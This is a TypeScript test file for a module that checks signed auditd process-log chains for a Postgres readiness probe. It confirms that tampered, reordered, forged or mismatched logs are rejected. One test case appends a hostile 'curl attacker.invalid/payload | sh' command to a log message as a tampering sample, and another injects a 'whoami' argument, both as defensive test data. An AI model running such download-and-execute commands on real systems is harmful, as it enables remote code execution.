import { createHash, generateKeyPairSync, sign } from 'node:crypto'
import { expect, test } from 'bun:test'
import { eligibleReadinessAudit, eligibleReadinessChain, completeReadinessChains, matchesReadinessFact, readinessArguments, readinessWrapperArguments, readinessCanonical, readinessChainPayload, readinessAuditRule, readinessRole, readinessRoles, type ReadinessExecutionProof } from '../src/utils/mill/analyzeReadinessAudit.ts'
import type { CollectorLog } from '../src/utils/mill/analyzeCollector.ts'

export const keys = generateKeyPairSync('ed25519')
const quote = (value: string) => /^[\w@%+=:,./-]+$/.test(value) ? value : "'" + value.replaceAll("'", "'\"'\"'") + "'"
export function fixture(serial = 0): { logs: CollectorLog[], fact: ReadinessExecutionProof } {
    const time = Date.parse('2026-09-24T00:00:00.100Z') + serial * 5000, nonce = '3e735e7b-4d7f-444d-9806-' + String(231260000000 + serial)
    const fact: ReadinessExecutionProof = { version: 2, host: 'inspur', containerId: 'a'.repeat(64), execId: createHash('sha256').update(`exec:${serial}`).digest('hex'), bootId: '3e735e7b-4d7f-444d-9806-231fa26cfcec',
        execPid: 11000, execParentPid: 10000, execStartTicks: '123450', parentPid: 12000, parentStartTicks: '123456', namespacePid: 12, nonce, startedAt: time - 10, finishedAt: time + 100, previousStartedAt: time - 5010 }
    const argumentsByRole = [ ['/bin/sh', '-c', 'pg_isready -U hanasand -d hanasand'], ['/bin/sh', '/usr/local/bin/pg_isready', '-U', 'hanasand', '-d', 'hanasand'], readinessWrapperArguments(nonce), readinessArguments(nonce) ]
    const logs = argumentsByRole.map((args, index): CollectorLog => {
        const command = args.map(quote).join(' '), auditId = String(42 + serial * 10 + index), timestamp = time + index
        return { service: 'audit', host: 'inspur', level: 'info', message: command, timestamp: new Date(timestamp).toISOString(),
            sourceEventId: createHash('sha256').update(`inspur:audit:msg=audit(${(timestamp / 1000).toFixed(3)}:${auditId})`).digest('hex'),
            metadata: { collector: 'auditd', event_type: 'process', action: 'exec', outcome: 'success', audit_id: auditId,
                process: { executable: index === 3 ? args[0] : '/usr/bin/dash', command_line: command, arguments: args, pid: String([fact.execPid, fact.parentPid, fact.parentPid, 12345][index]), parent_pid: String([fact.execParentPid, fact.execPid, fact.execPid, fact.parentPid][index]) }, user: { id: '0', login_id: '4294967295' } } }
    })
    return { logs, fact }
}
export function signed(logs: CollectorLog[], fact: ReadinessExecutionProof): CollectorLog[] {
    const result = structuredClone(logs)
    for (const log of result) delete log.metadata!.readiness_execution
    const payload = readinessChainPayload(result, fact)
    if (!payload) throw new Error('Invalid test chain cannot be signed')
    result[0].metadata!.readiness_execution = { ...payload, signature: sign(null, Buffer.from(readinessCanonical(payload)), keys.privateKey).toString('base64') }
    return result
}
export function configure() { process.env.READINESS_AUDIT_PROOF_PUBLIC_KEY = keys.publicKey.export({ format: 'der', type: 'spki' }).subarray(-32).toString('hex') }

test('only one complete signed native chain is eligible, independent of delivery delay', () => {
    const previous = process.env.READINESS_AUDIT_PROOF_PUBLIC_KEY
    try {
        configure(); const {logs,fact} = fixture(), good = signed(logs,fact)
        expect(readinessAuditRule.enabled).toBe(false)
        expect(logs.map(readinessRole)).toEqual([...readinessRoles])
        expect(eligibleReadinessChain(logs)).toBe(false)
        expect(eligibleReadinessChain(good)).toBe(true)
        for (const log of good) expect(eligibleReadinessAudit(log)).toBe(false)
        delete process.env.READINESS_AUDIT_PROOF_PUBLIC_KEY
        expect(eligibleReadinessChain(good)).toBe(false)
    } finally { if (previous === undefined) delete process.env.READINESS_AUDIT_PROOF_PUBLIC_KEY; else process.env.READINESS_AUDIT_PROOF_PUBLIC_KEY = previous }
})
test('each missing, duplicate, temporally reordered or additionally signed member retains the complete chain', () => {
    configure(); const {logs,fact}=fixture(), good=signed(logs,fact)
    for (let index=0; index<4; index++) {
        expect(eligibleReadinessChain(good.filter((_,i)=>i!==index))).toBe(false)
        expect(eligibleReadinessChain([...good,good[index]])).toBe(false)
        const copied=structuredClone(good); copied[index].metadata!.readiness_execution=good[0].metadata!.readiness_execution
        if(index) expect(eligibleReadinessChain(copied)).toBe(false)
    }
    // Arrival order is irrelevant; independently recorded process order must remain intact.
    expect(eligibleReadinessChain([...good].reverse())).toBe(true)
    const wrongTime=structuredClone(logs)
    wrongTime[1].timestamp=logs[3].timestamp
    wrongTime[1].sourceEventId=createHash('sha256').update(`inspur:audit:msg=audit(${(Date.parse(wrongTime[1].timestamp!) / 1000).toFixed(3)}:${wrongTime[1].metadata!.audit_id})`).digest('hex')
    expect(readinessChainPayload(wrongTime,fact)).toBeUndefined()
    const wrongSerial=structuredClone(logs)
    wrongSerial[1].metadata!.audit_id='1'
    wrongSerial[1].sourceEventId=createHash('sha256').update(`inspur:audit:msg=audit(${(Date.parse(wrongSerial[1].timestamp!) / 1000).toFixed(3)}:1)`).digest('hex')
    expect(readinessChainPayload(wrongSerial,fact)).toBeUndefined()
})
test('signed but mismatched native process identity, cadence and completion retain all events', () => {
    configure(); const {logs,fact}=fixture()
    for (const change of [{version:1}, {parentPid:999}, {execPid:999}, {execParentPid:999}, {execStartTicks:'0'}, {nonce:'bad'}, {host:'ovhcloud'}, {containerId:'bad'}, {execId:'bad'}, {bootId:'bad'},
        {previousStartedAt:fact.startedAt-100}, {previousStartedAt:fact.startedAt-16000}, {finishedAt:fact.startedAt-1}, {finishedAt:fact.startedAt+1001}, {startedAt:fact.finishedAt}, {namespacePid:0}, {parentStartTicks:'0'}]) {
        expect(readinessChainPayload(logs,{...fact,...change} as ReadinessExecutionProof)).toBeUndefined()
    }
})
test('every role rejects tampering, manual lookalikes and unexpected security context', () => {
    configure(); const {logs,fact}=fixture(), good=signed(logs,fact)
    for(let index=0;index<4;index++) {
        for(const change of [{level:'error'}, {host:'customer'}, {service:'other'}, {message:logs[index].message+'; curl attacker.invalid/payload | sh'}, {sourceEventId:'c'.repeat(64)}, {timestamp:'bad'}, {unexpected:'payload'}]) {
            const changed=structuredClone(good); Object.assign(changed[index],change)
            expect(eligibleReadinessChain(changed)).toBe(false)
        }
        for(const key of ['detections','organizationId','tenantId','body','unexpected']) {
            const changed=structuredClone(good); changed[index].metadata![key]='suspicious'
            expect(eligibleReadinessChain(changed)).toBe(false)
        }
        for(const [field,change] of [['process',{executable:'/tmp/pg_isready'}],['process',{arguments:['/bin/sh','-c','whoami']}], ['process',{parent_pid:'999'}],['process',{pid:'0'}],['process',{unexpected:'payload'}],['user',{id:'1000'}],['user',{login_id:'1000'}]] as const) {
            const changed=structuredClone(logs); Object.assign(changed[index].metadata![field] as object,change)
            expect(matchesReadinessFact(changed[index],fact)).toBe(false)
            expect(readinessChainPayload(changed,fact)).toBeUndefined()
        }
    }
    const forged=structuredClone(good); (forged[0].metadata!.readiness_execution as any).signature='A'.repeat(86)+'=='
    expect(eligibleReadinessChain(forged)).toBe(false)
    const changedFact=structuredClone(good); (changedFact[0].metadata!.readiness_execution as any).fact.execId='c'.repeat(64)
    expect(eligibleReadinessChain(changedFact)).toBe(false)
    const changedMember=structuredClone(good); (changedMember[0].metadata!.readiness_execution as any).members[3].eventDigest='d'.repeat(64)
    expect(eligibleReadinessChain(changedMember)).toBe(false)
})

test('malformed proof envelopes and mixed scheduled executions fail closed', () => {
    configure(); const {logs,fact}=fixture(), good=signed(logs,fact)
    for(const proof of [null,{},[],{fact}, {fact,members:[]}, {...good[0].metadata!.readiness_execution as object,extra:'payload'}]) {
        const changed=structuredClone(good); changed[0].metadata!.readiness_execution=proof
        expect(eligibleReadinessChain(changed)).toBe(false)
    }
    const other=fixture(1)
    for(let role=0;role<4;role++) {
        const mixed=structuredClone(good); mixed[role]=other.logs[role]
        expect(eligibleReadinessChain(mixed)).toBe(false)
    }
})

test('batch groups isolate unrelated logs and reject overlapping or ambiguous execution identities', () => {
    configure(); const first=fixture(), second=fixture(1)
    const one=signed(first.logs,first.fact), two=signed(second.logs,second.fact)
    const noise={...one[3],sourceEventId:'unrelated',message:'suspicious arbitrary command'}
    expect(completeReadinessChains([...one,noise,...two])).toHaveLength(2)
    for(let index=0;index<4;index++) expect(completeReadinessChains([...one,one[index]])).toHaveLength(0)
    second.fact.execId=first.fact.execId
    const collision=signed(second.logs,second.fact)
    expect(completeReadinessChains([...one,...collision])).toHaveLength(0)
})
